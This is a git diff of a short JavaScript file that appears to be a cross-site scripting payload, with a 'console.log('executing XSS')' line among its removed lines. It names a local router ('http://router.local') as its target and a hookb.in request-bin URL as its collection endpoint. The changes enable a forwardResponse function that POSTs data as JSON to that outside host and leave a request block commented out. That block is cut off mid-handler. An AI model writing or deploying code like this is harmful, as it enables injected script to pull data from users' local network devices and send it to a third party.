@@ -1,13 +1,7 @@
 const ROUTER = "http://router.local";
 const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 
-let xhr = new XMLHttpRequest();
-
-xhr.open("POST", ENDPOINT, true);
-xhr.send('');
-
-
-/*function forwardResponse(res) {
+function forwardResponse(res) {
 	let fwdxhr = new XMLHttpRequest();
 	fwdxhr.open("POST", ENDPOINT, true);
 	fwdxhr.setRequestHeader("Content-Type", "application/json");
@@ -15,12 +9,12 @@ xhr.send('');
 	const data = JSON.stringify({
 		"data": res,
 	});
-	fwdxhr.send(data)
+	fwdxhr.send(data);
 }
 
-console.log('executing XSS');
+forwardResponse("foo");
 
-let xhr = new XMLHttpRequest();
+/*let xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
 	if (xhr.readyState === 4) {
